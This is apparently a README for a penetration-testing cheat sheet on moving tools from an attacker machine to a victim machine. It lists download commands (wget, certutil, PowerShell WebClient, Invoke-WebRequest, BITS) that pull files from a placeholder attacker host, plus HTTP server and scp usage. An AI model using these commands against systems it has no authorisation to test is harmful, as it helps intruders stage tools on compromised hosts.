# tool-transfer

In the beginning of my journey I was struggling with getting my scripts and programs from machine to another. In this repo my objective is to find every way you can transfer your tools!

### HTTP

Set up an HTTP server on your attacker machine and download the files from the victim machine. The hosted file must be in the same directory where you execute this command.

python3 -m http.server $port$

python -m SimpleHTTPServer $port$

From the victim machine you can use any browser to navigate to the IP address and download the files or the following commands:

### CMD

wget http://$attacker_address$/$filename$

certutil -urlcache -split -f "http://$attacker_ip$:$port$/$filename$" $output-filename$

### Powershell

powershell "(New-Object System.Net.WebClient).Downloadfile('http://$ATTACKER_IP$:$port$/$filename$','$output-filename$')"

curl http://$attacker_address$/$filename$ -O $output-filename$
or
Invoke-WebRequest http://$attacker_address$/$filename$ -O $output-filename$

powershell.exe -c (Start-BitsTransfer -Source "http://$attacker_ip$/$filename$ -Destination C:\temp\$filename$")

### SSH

If you have an SSH session you can use SCP command to download files. To download/upload directories use the -r (recursive) switch

Downloading files from the host:

scp username@from_host:file.txt /local/directory/

Uploading files to the host:

scp file.txt username@to_host:/remote/directory/
